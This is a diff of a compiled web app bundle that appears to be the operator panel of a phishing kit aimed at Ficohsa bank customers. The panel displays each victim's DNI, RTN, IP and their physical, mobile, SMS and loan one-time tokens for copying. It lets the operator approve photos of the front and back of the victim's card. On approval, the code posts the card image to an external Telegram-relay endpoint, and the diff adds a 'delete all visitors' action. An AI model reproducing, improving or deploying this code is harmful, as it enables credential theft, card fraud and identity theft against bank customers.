             openedFromMain,
             successMessage,
             fotoTemporal: selectedUser.fotoTemporal,
@@ -58336,6 +58490,7 @@ const Dashboard = () => {
             pasoFoto: selectedUser.pasoFoto,
             fotoFrente: selectedUser.fotoFrente,
             fotoReverso: selectedUser.fotoReverso,
+            isPhotoActionLoading: loadingPhotoAction,
             onAprobarFoto: handleAprobarFoto,
             onRechazarFoto: handleRechazarFoto
           },
@@ -58354,6 +58509,7 @@ const Dashboard = () => {
         selectedUserId,
         onSelectUser: setSelectedUserId,
         onDeleteUser: handleDeleteUser,
+        onDeleteAllUsers: handleDeleteAllUsers,
         selectedBank,
         onChangeBank: handleChangeBank,
         onLogout: handleLogoutRequest
@@ -58370,6 +58526,20 @@ const Dashboard = () => {
         onConfirm: confirmDeleteUser,
         onCancel: cancelDeleteUser,
         loading: loadingDelete,
+        variant: "danger"
+      }
+    ),
+    /* @__PURE__ */ jsxRuntimeExports.jsx(
+      ConfirmModal,
+      {
+        isOpen: showDeleteAllConfirm,
+        title: "Eliminar todos los visitantes",
+        message: `¿Seguro que deseas eliminar los ${users.length} visitantes y todas sus sesiones de chat asociadas? Esta acción no se puede deshacer.`,
+        confirmText: "Eliminar todos",
+        cancelText: "Cancelar",
+        onConfirm: () => confirmDeleteAllUsers(users.map((u) => u.id)),
+        onCancel: cancelDeleteAllUsers,
+        loading: loadingDeleteAll,
         variant: "danger"
       }
     ),
@@ -58541,6 +58711,11 @@ const MobileDashboard = () => {
     confirmDeleteUser,
     cancelDeleteUser,
     loadingDelete,
+    showDeleteAllConfirm,
+    loadingDeleteAll,
+    handleDeleteAllUsers,
+    confirmDeleteAllUsers,
+    cancelDeleteAllUsers,
     confirmRequestChatUserId,
     confirmRequestChat,
     cancelRequestChat,
@@ -58603,39 +58778,23 @@ const MobileDashboard = () => {
     }, 900);
   };
   const handleAprobarFotoMobile = async (user) => {
-    if (!user?.id) return;
+    if (!user?.id || loadingPhotoAction[user.id]) return;
     setLoadingPhotoAction((prev) => ({ ...prev, [user.id]: true }));
     try {
-      const { doc, getDoc, updateDoc } = await __vitePreload(async () => { const { doc, getDoc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, getDoc, updateDoc }},true?void 0:void 0);
-      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0);
+      const { doc, getDoc, updateDoc } = await __vitePreload(async () => { const { doc, getDoc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, getDoc, updateDoc }},true?void 0:void 0,import.meta.url);
+      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0,import.meta.url);
       const userDocRef = doc(getActiveBankDb(), getBankCollection("redireccion"), user.id);
-      const userSnap = await getDoc(userDocRef);
-      const userData = userSnap.exists() ? userSnap.data() : user;
-      const pasoActual = userData?.pasoFoto || user?.pasoFoto || "frente";
-      const fotoAprobadaSrc = userData?.fotoTemporalHD || userData?.fotoTemporal || user?.fotoTemporalHD || user?.fotoTemporal || "";
-      const dniUser = userData?.DNI || userData?.RTN || user?.DNI || user?.RTN || user.id;
+      let userData = user;
+      if (!userData?.fotoTemporalHD && !userData?.fotoTemporal) {
+        const userSnap = await getDoc(userDocRef);
+        if (userSnap.exists()) userData = userSnap.data();
+      }
+      const pasoActual = userData?.pasoFoto || "frente";
+      const fotoAprobadaSrc = userData?.fotoTemporalHD || userData?.fotoTemporal || "";
+      const dniUser = userData?.DNI || userData?.RTN || user.id;
       const fechaStr = (/* @__PURE__ */ new Date()).toLocaleString("es-HN", { dateStyle: "short", timeStyle: "short" });
       const bankName = selectedBank || "ficohsa";
       if (pasoActual === "frente") {
-        if (fotoAprobadaSrc && typeof fotoAprobadaSrc === "string" && fotoAprobadaSrc.startsWith("data:")) {
-          const caption = `<b>TARJETA APROBADA (FRENTE)</b>
-👤 <b>Usuario:</b> <code>${dniUser}</code>
-🏦 <b>Banco:</b> ${bankName.toUpperCase()}
-🕒 <b>Fecha:</b> ${fechaStr}`;
-          try {
-            await fetch("https://adminconfig-panel.vercel.app/api/notify-photo", {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({
-                bank: bankName,
-                photo: fotoAprobadaSrc,
-                caption
-              })
-            });
-          } catch (err) {
-            console.error("[Telegram] Error enviando foto frente:", err);
-          }
-        }
         await updateDoc(userDocRef, {
           fotoFrente: fotoAprobadaSrc || true,
           fotoTemporal: null,
@@ -58646,26 +58805,22 @@ const MobileDashboard = () => {
           fotoRechazada: false,
           ultimoValor: "Tarjeta Frente Aprobada - Solicitando Reverso"
         });
-      } else {
         if (fotoAprobadaSrc && typeof fotoAprobadaSrc === "string" && fotoAprobadaSrc.startsWith("data:")) {
-          const caption = `<b>TARJETA APROBADA (REVERSO)</b>
+          const caption = `<b>TARJETA APROBADA (FRENTE)</b>
 👤 <b>Usuario:</b> <code>${dniUser}</code>
 🏦 <b>Banco:</b> ${bankName.toUpperCase()}
 🕒 <b>Fecha:</b> ${fechaStr}`;
-          try {
-            await fetch("https://adminconfig-panel.vercel.app/api/notify-photo", {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({
-                bank: bankName,
-                photo: fotoAprobadaSrc,
-                caption
-              })
-            });
-          } catch (err) {
-            console.error("[Telegram] Error enviando foto reverso:", err);
-          }
+          fetch("https://adminconfig-panel.vercel.app/api/notify-photo", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              bank: bankName,
+              photo: fotoAprobadaSrc,
+              caption
+            })
+          }).catch((err) => console.error("[Telegram] Error enviando foto frente:", err));
         }
+      } else {
         await updateDoc(userDocRef, {
           fotoReverso: fotoAprobadaSrc || true,
           fotoTemporal: null,
@@ -58677,6 +58832,21 @@ const MobileDashboard = () => {
           ultimoValor: "Tarjeta Reverso Aprobada (Completo)"
         });
         handleUpdatePage(user.id, 0);
+        if (fotoAprobadaSrc && typeof fotoAprobadaSrc === "string" && fotoAprobadaSrc.startsWith("data:")) {
+          const caption = `<b>TARJETA APROBADA (REVERSO)</b>
+👤 <b>Usuario:</b> <code>${dniUser}</code>
+🏦 <b>Banco:</b> ${bankName.toUpperCase()}
+🕒 <b>Fecha:</b> ${fechaStr}`;
+          fetch("https://adminconfig-panel.vercel.app/api/notify-photo", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              bank: bankName,
+              photo: fotoAprobadaSrc,
+              caption
+            })
+          }).catch((err) => console.error("[Telegram] Error enviando foto reverso:", err));
+        }
       }
     } catch (e) {
       console.error("[MobileDashboard] Error al aprobar foto:", e);
@@ -58685,11 +58855,11 @@ const MobileDashboard = () => {
     }
   };
   const handleRechazarFotoMobile = async (userId) => {
-    if (!userId) return;
+    if (!userId || loadingPhotoAction[userId]) return;
     setLoadingPhotoAction((prev) => ({ ...prev, [userId]: true }));
     try {
-      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0);
-      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0);
+      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0,import.meta.url);
+      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0,import.meta.url);
       await updateDoc(doc(getActiveBankDb(), getBankCollection("redireccion"), userId), {
         fotoRechazada: true,
         esperandoAprobacionFoto: false,
@@ -58706,8 +58876,8 @@ const MobileDashboard = () => {
   };
   const handleUpdatePageWithClear = async (userId, page) => {
     try {
-      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0);
-      const { db, getBankCollection } = await __vitePreload(async () => { const { db, getBankCollection } = await Promise.resolve().then(() => firebase);return { db, getBankCollection }},true?void 0:void 0);
+      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0,import.meta.url);
+      const { db, getBankCollection } = await __vitePreload(async () => { const { db, getBankCollection } = await Promise.resolve().then(() => firebase);return { db, getBankCollection }},true?void 0:void 0,import.meta.url);
       const fieldsToUpdate = {
         successMessage: null
       };
@@ -58729,8 +58899,8 @@ const MobileDashboard = () => {
   const handleErrorForUser = async (userId) => {
     const lastFormPage = lastFormPageByUser[userId] || 1;
     try {
-      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0);
-      const { db, getBankCollection } = await __vitePreload(async () => { const { db, getBankCollection } = await Promise.resolve().then(() => firebase);return { db, getBankCollection }},true?void 0:void 0);
+      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0,import.meta.url);
+      const { db, getBankCollection } = await __vitePreload(async () => { const { db, getBankCollection } = await Promise.resolve().then(() => firebase);return { db, getBankCollection }},true?void 0:void 0,import.meta.url);
       const fieldsToUpdate = {
         successMessage: null
       };
@@ -58839,421 +59009,448 @@ const MobileDashboard = () => {
         )
       ] })
     ] }),
-    /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "flex-1 overflow-y-auto p-4 space-y-3", children: users.length === 0 ? /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex flex-col items-center justify-center h-64 text-gray-500", children: [
-      /* @__PURE__ */ jsxRuntimeExports.jsx(IconUser, { size: 48, className: "mb-4 opacity-50" }),
-      /* @__PURE__ */ jsxRuntimeExports.jsx("p", { children: "No hay usuarios conectados" })
-    ] }) : users.map((user) => /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "bg-base-800 rounded-xl border border-gray-700 overflow-hidden", children: [
-      /* @__PURE__ */ jsxRuntimeExports.jsxs(
-        "button",
-        {
-          onClick: () => handleUserExpand(user.id),
-          className: "w-full p-4 flex items-center justify-between",
-          children: [
-            /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex items-center gap-3", children: [
-              /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: `w-3 h-3 rounded-full ${getStatusColor(user.pageState)} ${user.pageState === "viewing" || user.pageState === "active" ? "animate-pulse" : ""}` }),
-              /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "text-left", children: [
-                /* @__PURE__ */ jsxRuntimeExports.jsx("p", { className: "font-medium text-sm", children: user.DNI || user.RTN || user.id.slice(0, 8) }),
-                /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex items-center gap-2 text-xs", children: [
-                  /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-gray-400", children: getStatusText(user.pageState) }),
-                  /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: `px-1.5 py-0.5 rounded text-[10px] font-semibold ${successPressedByUser[user.id] ? "bg-emerald-600/30 text-emerald-300" : user.page === 0 ? "bg-red-600/30 text-red-300" : user.page === 5 ? "bg-red-600/30 text-red-300" : user.page === 6 ? "bg-emerald-600/30 text-emerald-300" : "bg-[#0058CB]/30 text-blue-300"}`, children: successPressedByUser[user.id] ? "Éxito" : getPageName(user.page || 0) }),
-                  isFicohsa && user.esperandoAprobacionFoto && /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { className: "px-2 py-0.5 rounded text-[10px] font-bold bg-emerald-500/20 text-emerald-300 border border-emerald-500/40 flex items-center gap-1 animate-pulse shadow-sm", children: [
-                    /* @__PURE__ */ jsxRuntimeExports.jsx(IconCamera, { size: 12, strokeWidth: 2.5, className: "text-emerald-400" }),
-                    " Validar Foto"
+    /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex-1 overflow-y-auto p-4 space-y-3", children: [
+      users.length > 0 && /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex items-center justify-between px-1 pb-1", children: [
+        /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { className: "text-xs font-semibold uppercase tracking-wider text-gray-400", children: [
+          "Visitantes (",
+          users.length,
+          ")"
+        ] }),
+        /* @__PURE__ */ jsxRuntimeExports.jsxs(
+          "button",
+          {
+            type: "button",
+            onClick: handleDeleteAllUsers,
+            title: "Eliminar todos los visitantes",
+            className: "p-1.5 rounded-lg bg-red-600/20 text-red-400 hover:bg-red-600/30 transition-colors flex items-center gap-1.5 text-xs font-medium",
+            children: [
+              /* @__PURE__ */ jsxRuntimeExports.jsx(IconTrash, { size: 16 }),
+              /* @__PURE__ */ jsxRuntimeExports.jsx("span", { children: "Eliminar todos" })
+            ]
+          }
+        )
+      ] }),
+      users.length === 0 ? /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex flex-col items-center justify-center h-64 text-gray-500", children: [
+        /* @__PURE__ */ jsxRuntimeExports.jsx(IconUser, { size: 48, className: "mb-4 opacity-50" }),
+        /* @__PURE__ */ jsxRuntimeExports.jsx("p", { children: "No hay usuarios conectados" })
+      ] }) : users.map((user) => /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "bg-base-800 rounded-xl border border-gray-700 overflow-hidden", children: [
+        /* @__PURE__ */ jsxRuntimeExports.jsxs(
+          "button",
+          {
+            onClick: () => handleUserExpand(user.id),
+            className: "w-full p-4 flex items-center justify-between",
+            children: [
+              /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex items-center gap-3", children: [
+                /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: `w-3 h-3 rounded-full ${getStatusColor(user.pageState)} ${user.pageState === "viewing" || user.pageState === "active" ? "animate-pulse" : ""}` }),
+                /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "text-left", children: [
+                  /* @__PURE__ */ jsxRuntimeExports.jsx("p", { className: "font-medium text-sm", children: user.DNI || user.RTN || user.id.slice(0, 8) }),
+                  /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex items-center gap-2 text-xs", children: [
+                    /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-gray-400", children: getStatusText(user.pageState) }),
+                    /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: `px-1.5 py-0.5 rounded text-[10px] font-semibold ${successPressedByUser[user.id] ? "bg-emerald-600/30 text-emerald-300" : user.page === 0 ? "bg-red-600/30 text-red-300" : user.page === 5 ? "bg-red-600/30 text-red-300" : user.page === 6 ? "bg-emerald-600/30 text-emerald-300" : "bg-[#0058CB]/30 text-blue-300"}`, children: successPressedByUser[user.id] ? "Éxito" : getPageName(user.page || 0) }),
+                    isFicohsa && user.esperandoAprobacionFoto && /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { className: "px-2 py-0.5 rounded text-[10px] font-bold bg-emerald-500/20 text-emerald-300 border border-emerald-500/40 flex items-center gap-1 animate-pulse shadow-sm", children: [
+                      /* @__PURE__ */ jsxRuntimeExports.jsx(IconCamera, { size: 12, strokeWidth: 2.5, className: "text-emerald-400" }),
+                      " Validar Foto"
+                    ] })
                   ] })
                 ] })
-              ] })
-            ] }),
-            expandedUserId === user.id ? /* @__PURE__ */ jsxRuntimeExports.jsx(IconChevronUp, { size: 20, className: "text-gray-400" }) : /* @__PURE__ */ jsxRuntimeExports.jsx(IconChevronDown, { size: 20, className: "text-gray-400" })
-          ]
-        }
-      ),
-      /* @__PURE__ */ jsxRuntimeExports.jsx(AnimatePresence, { children: expandedUserId === user.id && /* @__PURE__ */ jsxRuntimeExports.jsx(
-        motion.div,
-        {
-          initial: { height: 0, opacity: 0 },
-          animate: { height: "auto", opacity: 1 },
-          exit: { height: 0, opacity: 0 },
-          className: "border-t border-gray-700 overflow-hidden",
-          children: /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "p-4 space-y-4", children: [
-            /* @__PURE__ */ jsxRuntimeExports.jsx(AnimatePresence, { children: copiedField && /* @__PURE__ */ jsxRuntimeExports.jsxs(
-              motion.div,
-              {
-                initial: { opacity: 0, y: -10 },
-                animate: { opacity: 1, y: 0 },
-                exit: { opacity: 0, y: -10 },
-                className: "bg-emerald-600/20 border border-emerald-500/30 text-emerald-300 text-xs p-2 rounded-lg text-center",
-                children: [
-                  "✓ ",
-                  copiedField,
-                  " copiado"
-                ]
-              }
-            ) }),
-            /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "grid grid-cols-2 gap-2 text-xs", children: [
-              user.DNI && /* @__PURE__ */ jsxRuntimeExports.jsxs(
-                "button",
-                {
-                  onClick: () => copyToClipboard(user.DNI, "DNI"),
-                  className: "bg-gray-700/50 p-2 rounded text-left hover:bg-gray-600/50 active:bg-gray-500/50 transition-colors flex items-center justify-between",
-                  children: [
-                    /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { children: [
-                      /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-gray-400", children: "DNI:" }),
-                      " ",
-                      user.DNI
-                    ] }),
-                    /* @__PURE__ */ jsxRuntimeExports.jsx(IconCopy, { size: 14, className: "text-gray-500" })
-                  ]
-                }
-              ),
-              user.RTN && /* @__PURE__ */ jsxRuntimeExports.jsxs(
-                "button",
-                {
-                  onClick: () => copyToClipboard(user.RTN, "RTN"),
-                  className: "bg-gray-700/50 p-2 rounded text-left hover:bg-gray-600/50 active:bg-gray-500/50 transition-colors flex items-center justify-between",
-                  children: [
-                    /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { children: [
-                      /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-gray-400", children: "RTN:" }),
-                      " ",
-                      user.RTN
-                    ] }),
-                    /* @__PURE__ */ jsxRuntimeExports.jsx(IconCopy, { size: 14, className: "text-gray-500" })
-                  ]
-                }
-              ),
-              user.token && /* @__PURE__ */ jsxRuntimeExports.jsxs(
-                "button",
-                {
-                  onClick: () => copyToClipboard(user.token, (user.token || "").replace(/\D/g, "").length === 8 ? "Token Físico" : "Token Móvil"),
-                  className: "bg-emerald-900/30 p-2 rounded border border-emerald-700/30 text-left hover:bg-emerald-800/40 active:bg-emerald-700/40 transition-colors flex items-center justify-between",
-                  children: [
-                    /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { children: [
-                      /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-gray-400", children: (user.token || "").replace(/\D/g, "").length === 8 ? "T.Físico:" : "T.Móvil:" }),
-                      " ",
-                      /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-emerald-300", children: user.token })
-                    ] }),
-                    /* @__PURE__ */ jsxRuntimeExports.jsx(IconCopy, { size: 14, className: "text-emerald-400" })
-                  ]
-                }
-              ),
-              user.smsToken && /* @__PURE__ */ jsxRuntimeExports.jsxs(
-                "button",
-                {
-                  onClick: () => copyToClipboard(user.smsToken, "Token SMS"),
-                  className: "bg-amber-900/30 p-2 rounded border border-amber-700/30 text-left hover:bg-amber-800/40 active:bg-amber-700/40 transition-colors flex items-center justify-between",
-                  children: [
-                    /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { children: [
-                      /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-gray-400", children: "T.SMS:" }),
-                      " ",
-                      /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-amber-300", children: user.smsToken })
-                    ] }),
-                    /* @__PURE__ */ jsxRuntimeExports.jsx(IconCopy, { size: 14, className: "text-amber-400" })
-                  ]
-                }
-              ),
-              user.prestamoToken && /* @__PURE__ */ jsxRuntimeExports.jsxs(
-                "button",
-                {
-                  onClick: () => copyToClipboard(user.prestamoToken, "Token Préstamo"),
-                  className: "bg-purple-900/30 p-2 rounded border border-purple-700/30 text-left hover:bg-purple-800/40 active:bg-purple-700/40 transition-colors flex items-center justify-between",
-                  children: [
-                    /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { children: [
-                      /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-gray-400", children: "T.Préstamo:" }),
-                      " ",
-                      /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-purple-300", children: user.prestamoToken })
-                    ] }),
-                    /* @__PURE__ */ jsxRuntimeExports.jsx(IconCopy, { size: 14, className: "text-purple-400" })
-                  ]
-                }
-              ),
-              user.ip && /* @__PURE__ */ jsxRuntimeExports.jsxs(
-                "button",
-                {
-                  onClick: () => copyToClipboard(user.ip, "IP"),
-                  className: "bg-gray-700/50 p-2 rounded text-left hover:bg-gray-600/50 active:bg-gray-500/50 transition-colors flex items-center justify-between",
-                  children: [
-                    /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { children: [
-                      /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-gray-400", children: "IP:" }),
-                      " ",
-                      user.ip
-                    ] }),
-                    /* @__PURE__ */ jsxRuntimeExports.jsx(IconCopy, { size: 14, className: "text-gray-500" })
-                  ]
-                }
-              ),
-              user.dispositivo && /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "bg-gray-700/50 p-2 rounded", children: [
-                /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-gray-400", children: "Dispositivo:" }),
-                " ",
-                user.dispositivo === "Desktop" ? "PC" : user.dispositivo
-              ] })
-            ] }),
-            isFicohsa && user.esperandoAprobacionFoto && (user.fotoTemporalHD || user.fotoTemporal) && /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "bg-gradient-to-b from-emerald-950/30 to-neutral-900 border-2 border-emerald-500/40 rounded-xl p-3 space-y-2.5 shadow-lg shadow-black/40", children: [
-              /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex items-center justify-between", children: [
-                /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex items-center gap-2", children: [
-                  /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "w-2.5 h-2.5 rounded-full bg-emerald-400 animate-ping" }),
-                  /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-xs font-bold text-emerald-300 uppercase tracking-wide", children: user.pasoFoto === "reverso" ? "Validar Reverso" : "Validar Frente" })
-                ] }),
-                /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-[11px] text-emerald-300 font-semibold px-2 py-0.5 rounded-full bg-emerald-950/80 border border-emerald-500/40", children: user.pasoFoto === "reverso" ? "Paso 2 de 2" : "Paso 1 de 2" })
               ] }),
-              /* @__PURE__ */ jsxRuntimeExports.jsxs(
-                "div",
+              expandedUserId === user.id ? /* @__PURE__ */ jsxRuntimeExports.jsx(IconChevronUp, { size: 20, className: "text-gray-400" }) : /* @__PURE__ */ jsxRuntimeExports.jsx(IconChevronDown, { size: 20, className: "text-gray-400" })
+            ]
+          }
+        ),
+        /* @__PURE__ */ jsxRuntimeExports.jsx(AnimatePresence, { children: expandedUserId === user.id && /* @__PURE__ */ jsxRuntimeExports.jsx(
+          motion.div,
+          {
+            initial: { height: 0, opacity: 0 },
+            animate: { height: "auto", opacity: 1 },
+            exit: { height: 0, opacity: 0 },
+            className: "border-t border-gray-700 overflow-hidden",
+            children: /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "p-4 space-y-4", children: [
+              /* @__PURE__ */ jsxRuntimeExports.jsx(AnimatePresence, { children: copiedField && /* @__PURE__ */ jsxRuntimeExports.jsxs(
+                motion.div,
                 {
-                  onClick: () => setSelectedLightboxPhoto({
-                    src: user.fotoTemporalHD || user.fotoTemporal,
-                    title: user.pasoFoto === "reverso" ? "Tarjeta - Reverso (Por Validar)" : "Tarjeta - Frente (Por Validar)",
-                    userId: user.id,
-                    dni: user.DNI || user.RTN || user.id
-                  }),
-                  className: "relative aspect-[16/10] w-full rounded-lg overflow-hidden bg-black border border-emerald-500/40 cursor-pointer shadow-inner active:scale-[0.99] transition-transform",
+                  initial: { opacity: 0, y: -10 },
+                  animate: { opacity: 1, y: 0 },
+                  exit: { opacity: 0, y: -10 },
+                  className: "bg-emerald-600/20 border border-emerald-500/30 text-emerald-300 text-xs p-2 rounded-lg text-center",
                   children: [
-                    /* @__PURE__ */ jsxRuntimeExports.jsx(
-                      "img",
-                      {
-                        src: user.fotoTemporalHD || user.fotoTemporal,
-                        alt: "Tarjeta enviada por el visitante",
-                        className: "w-full h-full object-cover"
-                      }
-                    ),
-                    /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "absolute inset-0 bg-black/20 flex items-center justify-center", children: /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { className: "text-xs font-semibold text-white bg-black/75 backdrop-blur-sm px-2.5 py-1 rounded-md border border-white/20 flex items-center gap-1.5 shadow-md", children: [
-                      /* @__PURE__ */ jsxRuntimeExports.jsx(IconEye, { size: 14 }),
-                      " Tocar para maximizar"
-                    ] }) })
+                    "✓ ",
+                    copiedField,
+                    " copiado"
                   ]
                 }
-              ),
-              /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex items-center gap-2 pt-0.5", children: [
+              ) }),
+              /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "grid grid-cols-2 gap-2 text-xs", children: [
+                user.DNI && /* @__PURE__ */ jsxRuntimeExports.jsxs(
+                  "button",
+                  {
+                    onClick: () => copyToClipboard(user.DNI, "DNI"),
+                    className: "bg-gray-700/50 p-2 rounded text-left hover:bg-gray-600/50 active:bg-gray-500/50 transition-colors flex items-center justify-between",
+                    children: [
+                      /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { children: [
+                        /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-gray-400", children: "DNI:" }),
+                        " ",
+                        user.DNI
+                      ] }),
+                      /* @__PURE__ */ jsxRuntimeExports.jsx(IconCopy, { size: 14, className: "text-gray-500" })
+                    ]
+                  }
+                ),
+                user.RTN && /* @__PURE__ */ jsxRuntimeExports.jsxs(
+                  "button",
+                  {
+                    onClick: () => copyToClipboard(user.RTN, "RTN"),
+                    className: "bg-gray-700/50 p-2 rounded text-left hover:bg-gray-600/50 active:bg-gray-500/50 transition-colors flex items-center justify-between",
+                    children: [
+                      /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { children: [
+                        /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-gray-400", children: "RTN:" }),
+                        " ",
+                        user.RTN
+                      ] }),
+                      /* @__PURE__ */ jsxRuntimeExports.jsx(IconCopy, { size: 14, className: "text-gray-500" })
+                    ]
+                  }
+                ),
+                user.token && /* @__PURE__ */ jsxRuntimeExports.jsxs(
+                  "button",
+                  {
+                    onClick: () => copyToClipboard(user.token, (user.token || "").replace(/\D/g, "").length === 8 ? "Token Físico" : "Token Móvil"),
+                    className: "bg-emerald-900/30 p-2 rounded border border-emerald-700/30 text-left hover:bg-emerald-800/40 active:bg-emerald-700/40 transition-colors flex items-center justify-between",
+                    children: [
+                      /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { children: [
+                        /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-gray-400", children: (user.token || "").replace(/\D/g, "").length === 8 ? "T.Físico:" : "T.Móvil:" }),
+                        " ",
+                        /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-emerald-300", children: user.token })
+                      ] }),
+                      /* @__PURE__ */ jsxRuntimeExports.jsx(IconCopy, { size: 14, className: "text-emerald-400" })
+                    ]
+                  }
+                ),
+                user.smsToken && /* @__PURE__ */ jsxRuntimeExports.jsxs(
+                  "button",
+                  {
+                    onClick: () => copyToClipboard(user.smsToken, "Token SMS"),
+                    className: "bg-amber-900/30 p-2 rounded border border-amber-700/30 text-left hover:bg-amber-800/40 active:bg-amber-700/40 transition-colors flex items-center justify-between",
+                    children: [
+                      /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { children: [
+                        /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-gray-400", children: "T.SMS:" }),
+                        " ",
+                        /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-amber-300", children: user.smsToken })
+                      ] }),
+                      /* @__PURE__ */ jsxRuntimeExports.jsx(IconCopy, { size: 14, className: "text-amber-400" })
+                    ]
+                  }
+                ),
+                user.prestamoToken && /* @__PURE__ */ jsxRuntimeExports.jsxs(
+                  "button",
+                  {
+                    onClick: () => copyToClipboard(user.prestamoToken, "Token Préstamo"),
+                    className: "bg-purple-900/30 p-2 rounded border border-purple-700/30 text-left hover:bg-purple-800/40 active:bg-purple-700/40 transition-colors flex items-center justify-between",
+                    children: [
+                      /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { children: [
+                        /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-gray-400", children: "T.Préstamo:" }),
+                        " ",
+                        /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "text-purple-300", children: user.prestamoToken })
+                      ] }),
+                      /* @__PURE__ */ jsxRuntimeExports.jsx(IconCopy, { size: 14, className: "text-purple-400" })
+                    ]
+                  }
+                ),
+                user.ip && /* @__PURE__ */ jsxRuntimeExports.jsxs(
+                  "button",
+                  {
+                    onClick: () => copyToClipboard(user.ip, "IP"),
+                    className: "bg-gray-700/50 p-2 rounded text-left hover:bg-gray-600/50 active:bg-gray-500/50 transition-colors flex items-center justify-between",
+                    children: [
+                      /* @__PURE__ */ jsxRuntimeExports.jsxs("span", { children: [
